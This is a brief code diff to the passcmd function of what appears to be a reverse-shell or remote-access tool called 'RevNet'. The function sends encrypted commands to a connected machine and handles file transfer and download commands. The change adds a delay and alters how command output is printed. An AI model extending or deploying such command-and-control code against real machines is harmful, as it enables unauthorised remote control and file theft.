@@ -95,6 +95,8 @@ def passcmd():
 
             RevNet.send_all(c,str.encode(RevNet.enc(cmd)))
 
+            time.sleep(10)
+
             c.close()
 
             s.close()
@@ -137,9 +139,7 @@ def passcmd():
 
             RevNet.ftrans(c,cmd[7:])
 
-            crecv=RevNet.dec(str(RevNet.recv_all(c).decode("utf-8")))
-
-            print(crecv, end="")
+            print(cdir,end="")
 
         elif cmd[:8]=="download":
 
